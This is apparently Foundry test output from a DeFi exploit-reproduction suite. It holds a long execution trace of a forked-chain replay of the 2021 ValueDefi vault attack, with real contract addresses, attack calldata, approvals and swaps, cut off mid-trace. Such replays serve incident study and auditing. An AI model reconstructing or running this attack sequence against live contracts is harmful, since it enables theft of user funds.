Compiling 25 files with Solc 0.8.10
Compiling 26 files with Solc 0.8.25
Solc 0.8.10 finished in 846.35ms
Solc 0.8.25 finished in 954.59ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    тФЬтФА [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 272.73ms (524.96┬╡s CPU time)

Ran 1 test for src/test/2021-05/ValueDefi_exp.sol:ContractTest
[PASS] testExploit() (gas: 1229287)
Logs:
  [Start] WBNB Balance of attacker: 273.813109335418386629
  [End] WBNB balance of attacker after exploit: 0.000000000000000000
  [End] Attacker vSafeWBNB balance after exploit: 396.169639688580127539

Traces:
  [1477087] ContractTest::testExploit()
    тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233) [staticcall]
    тФВ   тФФтФА тЖР [Return] 273813109335418386629 [2.738e20]
    тФЬтФА emit log_named_decimal_uint(key: "[Start] WBNB Balance of attacker", val: 273813109335418386629 [2.738e20], decimals: 18)
    тФЬтФА [0] VM::startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [1438443] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::work{value: 1000000000000000000}(0, 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, 1000000000000000000 [1e18], 393652744565353082751500 [3.936e23], 1000000000000000000000000 [1e24], 0x000000000000000000000000e38ebfe8f314dcad61d5adcb29c1a26f41bed0be00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000060000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000)
    тФВ   тФЬтФА [1431134] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::work{value: 1000000000000000000}(0, 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, 1000000000000000000 [1e18], 393652744565353082751500 [3.936e23], 1000000000000000000000000 [1e24], 0x000000000000000000000000e38ebfe8f314dcad61d5adcb29c1a26f41bed0be00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000060000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    тФВ   тФВ   тФЬтФА [9973] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::getWrappedNativeAddr() [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [2733] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::getWrappedNativeAddr() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    тФВ   тФВ   тФЬтФА [1473] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::getWrappedNativeAddr() [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [733] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::getWrappedNativeAddr() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    тФВ   тФВ   тФЬтФА [6874] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::deposit{value: 1000000000000000000}()
    тФВ   тФВ   тФВ   тФЬтФА emit Deposit(dst: 0xd7D069493685A581d27824Fc46EdA46B7EfC0063, wad: 1000000000000000000 [1e18])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 399294371522942795751905 [3.992e23]
    тФВ   тФВ   тФЬтФА [7143] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::getInterestRate(406162327444753785579034 [4.061e23], 399293371522942795751905 [3.992e23]) [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [6397] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::getInterestRate(406162327444753785579034 [4.061e23], 399293371522942795751905 [3.992e23]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [797] 0x375D32FadA30d7e6Fea242FCa221a22CC6d52B30::getInterestRate(406162327444753785579034 [4.061e23], 399293371522942795751905 [3.992e23]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000017a029afc
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000017a029afc
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000000000000017a029afc
    тФВ   тФВ   тФЬтФА [3038] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::getReservePoolBps() [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [2298] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::getReservePoolBps() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000003e8
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000000000000003e8
    тФВ   тФВ   тФЬтФА  emit topic 0: 0x73c4ef442856bea52a6b34a83f35484ee65828010254ec27766c5a8c13db6c84
    тФВ   тФВ   тФВ        topic 1: 0x0000000000000000000000000000000000000000000000000000000000003068
    тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000535bf542508f7cdf8a0c
    тФВ   тФВ   тФЬтФА [3404] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::isWorker(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [2661] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::isWorker(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    тФВ   тФВ   тФЬтФА [65114] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::acceptDebt(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [64371] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::acceptDebt(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [61018] 0xADaBC5FC5da42c85A84e66096460C769a151A8F8::acceptDebt(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [53775] 0x3175EC52c36fFF63dCe00E8a50E6066D38884a11::acceptDebt(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9841] 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4::lpToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2601] 0x7880Fd4125772d5Ef0e6F342E209c193d8c2c8A3::lpToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000ed7e52944161450477ee417de9cd3a859b14fd0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000ed7e52944161450477ee417de9cd3a859b14fd0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2465] 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0::token0() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2397] 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0::token1() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2893] 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 21670866745456119367655811 [2.167e25], 1261919850126014855744491 [1.261e24], 1620418383 [1.62e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2531] 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82::balanceOf(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 21670866745456119367655811 [2.167e25]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1261919850126014855744491 [1.261e24]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [10173] 0x166f56F2EDa9817cAB77118AE4FCAA0002A17eC7::getPrice(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2924] 0x588c58d88319B2EDF7426006668cDfF60940F3C7::getPrice(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000ceb793397264a80000000000000000000000000000000000000000000000000000000060959d33
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000000000ceb793397264a80000000000000000000000000000000000000000000000000000000060959d33
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 399294371522942795751905 [3.992e23]
    тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 399294371522942795751905 [3.992e23]
    тФВ   тФВ   тФЬтФА [25162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, 393653744565353082751500 [3.936e23])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xd7D069493685A581d27824Fc46EdA46B7EfC0063, to: 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, value: 393653744565353082751500 [3.936e23])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [1123189] 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4::work(12392 [1.239e4], 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 393652744565353082751500 [3.936e23], 0x000000000000000000000000e38ebfe8f314dcad61d5adcb29c1a26f41bed0be00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000060000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000)
    тФВ   тФВ   тФВ   тФЬтФА [1122392] 0x7880Fd4125772d5Ef0e6F342E209c193d8c2c8A3::work(12392 [1.239e4], 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 393652744565353082751500 [3.936e23], 0x000000000000000000000000e38ebfe8f314dcad61d5adcb29c1a26f41bed0be00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000060000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [2537] 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0::balanceOf(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [5303] 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0::transfer(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, to: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393653744565353082751500 [3.936e23]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [8062] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 393653744565353082751500 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, to: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, value: 393653744565353082751500 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [1078338] 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be::execute(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 393652744565353082751500 [3.936e23], 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1071065] 0x77d23aFF927f3d46e51D449372c957B3CBBFB40e::execute(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 393652744565353082751500 [3.936e23], 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [25318] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393653744565353082751502 [3.936e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2893] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 98044021765772833 [9.804e16], 102000000000000000 [1.02e17], 1620418353 [1.62e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2465] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::token0() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [81082] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(200530186785656029801 [2.005e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b], 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 1620418383 [1.62e9])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [893] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 98044021765772833 [9.804e16], 102000000000000000 [1.02e17], 1620418353 [1.62e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, 200530186785656029801 [2.005e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, to: 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, value: 200530186785656029801 [2.005e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [63495] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::swap(97994052010212825 [9.799e16], 0, 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [30808] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::transfer(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 97994052010212825 [9.799e16])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, to: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, value: 97994052010212825 [9.799e16])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [841] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 49969755560008 [4.996e13]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 200632186785656029801 [2.006e20]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 49969755560008 [4.996e13], reserve1: 200632186785656029801 [2.006e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 200530186785656029801 [2.005e20], amount0Out: 97994052010212825 [9.799e16], amount1Out: 0, to: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] [200530186785656029801 [2.005e20], 97994052010212825 [9.799e16]]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393453214378567426721701 [3.934e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [841] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::balanceOf(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 97994052010212825 [9.799e16]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [112833] 0x10ED43C718714eb63d5aA57B78B54704E256024E::addLiquidity(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b, 393453214378567426721701 [3.934e23], 97994052010212825 [9.799e16], 0, 0, 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 1620418383 [1.62e9])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [893] 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 49969755560008 [4.996e13], 200632186785656029801 [2.006e20], 1620418383 [1.62e9]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3425] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, 393453214378564865361669 [3.934e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, to: 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, value: 393453214378564865361669 [3.934e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7300] 0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b::transferFrom(0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, 0xBFa618F7B7078bE3B00F5CcfB85907083EFAB9F0, 97994052010212825 [9.799e16])
